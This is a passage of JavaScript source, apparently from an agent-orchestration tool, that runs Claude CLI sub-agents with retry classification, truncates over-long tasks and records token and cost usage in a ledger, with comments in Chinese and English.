          if (ruIn > 0 || ruOut > 0) { ledgerIn += ruIn + ruCachedIn; ledgerRawIn += ruIn; ledgerOut += ruOut; ledgerCachedIn += ruCachedIn; }
          else if ((Number(res.msgBillInMax) || 0) > 0 || (Number(res.msgBillOutMax) || 0) > 0) {
            ledgerIn += Number(res.msgBillInMax) || 0; ledgerRawIn += Number(res.msgBillInMax) || 0; ledgerOut += Number(res.msgBillOutMax) || 0; ledgerEstimated = true;
          }
          if (Number.isFinite(res.resultCostUsd)) ledgerCostUsd = (Number.isFinite(ledgerCostUsd) ? ledgerCostUsd : 0) + res.resultCostUsd;
        } catch { /* never let accounting break the attempt */ }
        return res;
      },
      classify: (res, { retries }) => {
        const attempt = retries + 1;
        const finalText = (res.resultText || res.assistantText).trim();
        const ok = !killed && res.exitCode === 0 && res.resultOk && !!finalText;
        if (ok) { okText = finalText; okToolCalls = res.toolCallCount; return 'done'; }
        lastFinalText = finalText; lastToolCalls = res.toolCallCount;
        lastErr = killed ? '节点已中止或空闲超时' : (String(res.stderrText || '').trim().slice(0, 2000) || finalText || `claude 退出码 ${res.exitCode}`);
        const cls = classifyClaudeSubagentFailure({ killed, exitCode: res.exitCode, stderrText: res.stderrText, assistantText: res.assistantText, toolCallCount: res.toolCallCount, gotResult: res.gotResult, resultOk: res.resultOk, resultText: res.resultText });
        if (killed || !cls.retry || attempt >= MAX_ATTEMPTS) return 'stop';
        // 45c:over_window → 缩载后新鲜重试(一次性 spawn 无 resume,超窗 = 任务载荷本身过大;cap 60K 字符)。
        // 45f P3-7:任务本就不超 60K 时缩无可缩(超窗根因是系统提示/schema),重试必败 —— 不再白烧一次 spawn。
        if (cls.reason === 'over_window') {
          const raw = String(task || '');
          if (overWindowShrunk || raw.length <= 60000) return 'stop';
          overWindowShrunk = true;
          taskForAttempt = raw.slice(0, 60000) + `\n\n…(原任务 ${raw.length} 字符,上次因上下文超限失败已截断;请聚焦完成可达部分)`;
        }
        retryReason = cls.reason;
        return 'retry';
      },
      onRetry: (res, attempt) => {
        onEvent({ type: 'subagent', id: subagentId, state: 'retry', attempt: attempt + 1, maxAttempts: MAX_ATTEMPTS, reason: retryReason, error: String(res.stderrText || '').trim().slice(0, 500) || `claude 退出码 ${res.exitCode}` });
      },
    });
    if (okText !== null) {
      onEvent({ type: 'subagent', id: subagentId, state: 'end', ok: true, resultChars: okText.length, task: String(displayTask != null ? displayTask : task || ''), tookMs: Date.now() - started, agentKey, dependsOn: dependsOn || [], roleId: role && role.id || '', roleLabel: role && role.label || '', model: subModel || 'inherit', engine: 'claude' });
      return { ok: true, result: okText, iters: 1, toolCalls: okToolCalls };
    }
    if (!killed && lastFinalText.trim().length >= 80 && lastToolCalls > 0) {
      onEvent({ type: 'subagent', id: subagentId, state: 'end', ok: true, degraded: true, resultChars: lastFinalText.length, task: String(displayTask != null ? displayTask : task || ''), tookMs: Date.now() - started, agentKey, dependsOn: dependsOn || [], roleId: role && role.id || '', roleLabel: role && role.label || '', model: subModel || 'inherit', engine: 'claude' });
      return { ok: true, degraded: true, warning: lastErr || 'Claude CLI exited after producing usable output', result: lastFinalText, iters: 1, toolCalls: lastToolCalls };
    }
    onEvent({ type: 'subagent', id: subagentId, state: 'end', ok: false, resultChars: lastFinalText.length, task: String(displayTask != null ? displayTask : task || ''), tookMs: Date.now() - started, agentKey, dependsOn: dependsOn || [], roleId: role && role.id || '', roleLabel: role && role.label || '', model: subModel || 'inherit', engine: 'claude' });
    return { ok: false, error: lastErr || '子代理未产出结论', result: lastFinalText, iters: 1, toolCalls: lastToolCalls };
  } finally {
    // v1.4-OSS 用量看板(补): ONE ledger row for the whole node (accumulated across attempts). Billing fields via
    // claudeCostFields (与主回合同源). No parentSession → nothing to anchor a row to; skip. Zero-token rows are
    // dropped inside appendUsageLedger, so the 'CLI 未找到' early-return above (never reaches here anyway) needs
    // no special case, and a purely-aborted node with no usage records nothing.
    try {
      if (parentSession) {
        const { provider: claudeProvider, cost, currency, costTrusted } = claudeCostFields(config, ledgerRawIn, ledgerOut, ledgerCostUsd);
        appendUsageLedger({
          sessionId: parentSession.id, engine: 'claude', provider: claudeProvider,
          // A workflow node can pass model:'inherit' straight through (subModel === 'inherit'); the model that
          // actually ran is then config.model — record that, never the literal 'inherit'.
          model: (subModel && subModel !== 'inherit') ? subModel : (config.model || ''), inTok: ledgerIn, outTok: ledgerOut,
          cachedInTok: ledgerCachedIn, cost, currency, costTrusted, estimated: ledgerEstimated, turnSeq: parentSession.turnSeq,
          kind: 'subagent', agentKey, subagentId,
        });
        // 29c: 用量随事件上抛 —— DAG 节点的 nodeEvent 借此把 token/成本累进 run.usageTotals(前端画布迷你条
        // 与运行卡 chip 早已防御性读这些字段,"后端并行落地中"说的就是这里)。与 ledger 同源同值。
        onEvent({ type: 'subagent_usage', id: subagentId, agentKey, inTok: ledgerIn, outTok: ledgerOut, cost, currency, estimated: ledgerEstimated });
      }
    } catch { /* accounting must never break the sub-agent */ }
  }
}
